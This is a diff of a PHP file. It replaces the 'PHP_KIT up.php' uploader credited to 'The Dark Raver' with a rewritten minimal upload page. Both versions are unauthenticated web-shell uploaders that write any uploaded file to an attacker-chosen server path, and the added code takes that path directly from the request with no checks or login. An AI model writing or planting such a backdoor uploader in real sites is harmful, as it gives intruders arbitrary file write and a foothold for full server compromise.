@@ -1,33 +1,10 @@
-<?
-//
-// PHP_KIT
-//
-// up.php = File Upload
-//
-// by: The Dark Raver
-// modified: 21/01/2004
-//
+<?php
+ 
+$files = @$_FILES["files"];
+if ($files["name"] != '') {
+    $fullpath = $_REQUEST["path"] . $files["name"];
+    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
+        echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
+    }
+}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
 ?>
-
-<html><body>
-
-<form enctype="multipart/form-data" action="" method="post">
-<input type="hidden" name="MAX_FILE_SIZE" value="1000000">
-<p>Local File: <input name="userfile" type="file">
-<p>Remote File: <input name="remotefile" type="text">
-<input type="submit" value="Send">
-</form><br><br><br>
-
-<?
-
-if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {
-   copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);
-   echo "Uploaded file: " . $HTTP_POST_FILES['userfile']['name'];
-} else {
-   echo "No File Uploaded";
-}
-
-?>
-
-</html></body>
-
